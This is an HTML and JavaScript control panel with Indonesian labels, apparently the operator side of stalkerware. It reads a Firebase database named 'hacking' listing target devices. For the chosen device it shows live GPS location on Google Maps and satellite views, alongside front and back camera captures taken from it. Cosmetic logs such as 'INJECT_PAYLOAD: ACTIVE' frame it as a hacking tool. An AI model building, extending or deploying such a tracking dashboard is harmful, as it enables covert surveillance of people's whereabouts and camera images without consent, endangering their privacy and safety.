<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER_COMMAND // TRACKING SYSTEM</title>
    <style>
        html, body {
            background-color: #05070c;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 6px;
            box-sizing: border-box;
            font-size: 11px;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px dashed #00ff66;
            padding-bottom: 4px;
            margin-bottom: 6px;
            flex-shrink: 0;
        }
        .selector-box select {
            background: #000;
            color: #00ff66;
            border: 1px solid #00ff66;
            padding: 2px;
            font-family: 'Courier New', Courier, monospace;
        }
        .clock-box {
            text-align: right;
            font-size: 10px;
            line-height: 1.3;
            background: #000;
            border: 1px solid #00ff66;
            padding: 2px 4px;
        }
        .main-layout {
            display: grid;
            grid-template-columns: 1.2fr 1fr;
            gap: 6px;
            flex-grow: 1;
            min-height: 0;
            margin-bottom: 6px;
        }
        .left-panel {
            display: flex;
            flex-direction: column;
            min-height: 0;
        }
        .right-panel {
            display: grid;
            grid-template-rows: 1fr 1fr;
            gap: 6px;
            min-height: 0;
        }
        .right-top-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 6px;
            min-height: 0;
        }
        .box-container {
            border: 1px solid #00ff66;
            background: #0b0f19;
            padding: 4px;
            position: relative;
            display: flex;
            flex-direction: column;
            min-height: 0;
        }
        .box-container.full-height {
            flex-grow: 1;
        }
        .box-title {
            font-size: 9px;
            color: #aaa;
            margin-bottom: 3px;
            text-transform: uppercase;
            flex-shrink: 0;
        }
        #mainMap {
            width: 100%;
            flex-grow: 1;
            border: none;
            background: #000;
            min-height: 0;
        }
        iframe {
            width: 100%;
            border: none;
            background: #000;
            flex-grow: 1;
            min-height: 0;
        }
        .camera-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4px;
            flex-grow: 1;
            min-height: 0;
        }
        .cam-box {
            display: flex;
            flex-direction: column;
            min-height: 0;
        }
        .cam-box img {
            width: 100%;
            flex-grow: 1;
            object-fit: cover;
            border: 1px solid #00ff66;
            background: #000;
            min-height: 0;
        }
        .matrix-box {
            flex-grow: 1;
            overflow-y: auto;
            background: #020408;
            border: 1px solid #00ff66;
            padding: 3px;
            font-size: 9px;
            color: #00ff66;
            min-height: 0;
        }
        .terminal-container {
            border: 1px solid #00ff66;
            background: #020408;
            padding: 4px;
            height: 42px;
            overflow-y: auto;
            font-size: 9px;
            flex-shrink: 0;
        }
        .btn-maps {
            display: inline-block;
            background: #00ff66;
            color: #000;
            text-decoration: none;
            padding: 2px 5px;
            font-weight: bold;
            font-size: 9px;
            margin-bottom: 4px;
            flex-shrink: 0;
        }
        .bg-status {
            font-size: 8px;
            color: #00ffcc;
            float: right;
        }
    </style>
</head>
<body>

    <!-- Header Status -->
    <div class="header">
        <div>[ COMMAND_CENTER ] &nbsp; <span style="color:#00ff66;">[LIVE]</span></div>
        <div class="selector-box">
            Target: 
            <select id="targetSelect" onchange="switchTarget()">
                <option value="">-- Pilih Perangkat --</option>
            </select>
        </div>
        <div class="clock-box" id="clockDisplay">00:00:00<br>0/0/0000</div>
    </div>

    <!-- Main Layout -->
    <div class="main-layout">
        
        <!-- Kolom Kiri: Peta Utama (GPS) -->
        <div class="left-panel">
            <div class="box-container full-height">
                <a id="gmapsLink" href="#" target="_blank" class="btn-maps">Buka di Maps ↗</a>
                <iframe id="mainMap" src="about:blank"></iframe>
            </div>
        </div>

        <!-- Kolom Kanan: Sesuai Sketsa (Atas: Satelit & Matrix | Bawah: Live Camera) -->
        <div class="right-panel">
            
            <!-- Baris Atas Kanan: Peta Satelit Mini & Matrix Stream -->
            <div class="right-top-grid">
                <div class="box-container">
                    <div class="box-title">SATELLITE_FEED</div>
                    <iframe id="satMap" src="about:blank"></iframe>
                </div>

                <div class="box-container">
                    <div class="box-title">MATRIX_STREAM</div>
                    <div class="matrix-box" id="matrixStream">
                        > [SYSTEM] Stream worker initialized...<br>
                    </div>
                </div>
            </div>

            <!-- Baris Bawah Kanan: Live Camera Depan & Belakang -->
            <div class="box-container">
                <div class="box-title">
                    LIVE_CAMERA (FRONT / BACK) 
                    <span class="bg-status" id="bgSyncStatus">[SYNC: OK]</span>
                </div>
                <div class="camera-container">
                    <div class="cam-box">
                        <img id="imgFront" src="https://via.placeholder.com/320x240?text=Waiting..." alt="Kamera Depan">
                        <div style="text-align:center; font-size:8px; margin-top:2px;">Depan</div>
                    </div>
                    <div class="cam-box">
                        <img id="imgBack" src="https://via.placeholder.com/320x240?text=Waiting..." alt="Kamera Belakang">
                        <div style="text-align:center; font-size:8px; margin-top:2px;">Belakang</div>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <!-- Terminal Log di Bawah -->
    <div class="terminal-container" id="terminalLog">
        > [SYSTEM] Initializing multi-target monitor interface...<br>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        let allTargetsData = {};
        let selectedTargetId = localStorage.getItem("selected_target_id") || "";
        let targetImages = {};

        const targetSelect = document.getElementById('targetSelect');
        const mainMap = document.getElementById('mainMap');
        const satMap = document.getElementById('satMap');
        const gmapsLink = document.getElementById('gmapsLink');
        const imgFront = document.getElementById('imgFront');
        const imgBack = document.getElementById('imgBack');
        const terminalLog = document.getElementById('terminalLog');
        const matrixStream = document.getElementById('matrixStream');

        function logTerminal(text) {
            terminalLog.innerHTML += `> ${text}<br>`;
            terminalLog.scrollTop = terminalLog.scrollHeight;
        }

        setInterval(() => {
            const now = new Date();
            document.getElementById('clockDisplay').innerHTML = `${now.toTimeString().split(' ')[0]}<br>${now.toLocaleDateString()}`;
        }, 1000);

        const matrixLogs = [
            "BG_WORKER: SYNCING_STREAM",
            "PACKET_VERIFY: OK",
            "CAM_SOCKET: LISTENING",
            "INJECT_PAYLOAD: ACTIVE"
        ];
        
        setInterval(() => {
            const randomLog = matrixLogs[Math.floor(Math.random() * matrixLogs.length)];
            matrixStream.innerHTML += `> [${new Date().toTimeString().split(' ')[0]}] ${randomLog}<br>`;
            matrixStream.scrollTop = matrixStream.scrollHeight;
        }, 3000);

        db.ref("camera_logs").limitToLast(50).on("child_added", (snapshot) => {
            const data = snapshot.val();
            if (data && data.targetId) {
                if (!targetImages[data.targetId]) {
                    targetImages[data.targetId] = { Depan: null, Belakang: null };
                }
                targetImages[data.targetId][data.cameraType] = data.image;

                if (data.targetId === selectedTargetId) {
                    updateCameraUI(selectedTargetId);
                }
            }
        });

        db.ref("targets").on("value", (snapshot) => {
            const targets = snapshot.val();
            if (!targets) {
                targetSelect.innerHTML = '<option value="">-- Tidak ada perangkat --</option>';
                return;
            }

            allTargetsData = targets;
            const targetIds = Object.keys(targets);

            let optionsHTML = '<option value="">-- Pilih Perangkat --</option>';
            targetIds.forEach(id => {
                const tName = targets[id].device || id;
                const isSelected = (id === selectedTargetId) ? 'selected' : '';
                optionsHTML += `<option value="${id}" ${isSelected}>${tName} (${id})</option>`;
            });
            targetSelect.innerHTML = optionsHTML;

            if (!selectedTargetId || !targets[selectedTargetId]) {
                selectedTargetId = targetIds[0];
                targetSelect.value = selectedTargetId;
                localStorage.setItem("selected_target_id", selectedTargetId);
            }

            renderSelectedTargetData();
        });

        function switchTarget() {
            selectedTargetId = targetSelect.value;
            localStorage.setItem("selected_target_id", selectedTargetId);
            renderSelectedTargetData();
            logTerminal(`[SYSTEM] Switched focus to: ${selectedTargetId}`);
        }

        function renderSelectedTargetData() {
            if (!selectedTargetId || !allTargetsData[selectedTargetId]) return;

            const data = allTargetsData[selectedTargetId];
            const lat = data.latitude;
            const lon = data.longitude;

            mainMap.src = `https://maps.google.com/maps?q=${lat},${lon}&z=16&output=embed`;
            satMap.src = `https://maps.google.com/maps?q=${lat},${lon}&z=18&t=k&output=embed`;
            gmapsLink.href = `https://www.google.com/maps?q=${lat},${lon}`;

            updateCameraUI(selectedTargetId);
        }

        function updateCameraUI(tId) {
            const imgs = targetImages[tId];
            if (imgs) {
                if (imgs.Depan) imgFront.src = imgs.Depan;
                if (imgs.Belakang) imgBack.src = imgs.Belakang;
            } else {
                imgFront.src = "https://via.placeholder.com/320x240?text=Waiting...";
                imgBack.src = "https://via.placeholder.com/320x240?text=Waiting...";
            }
        }
    </script>
</body>
</html>
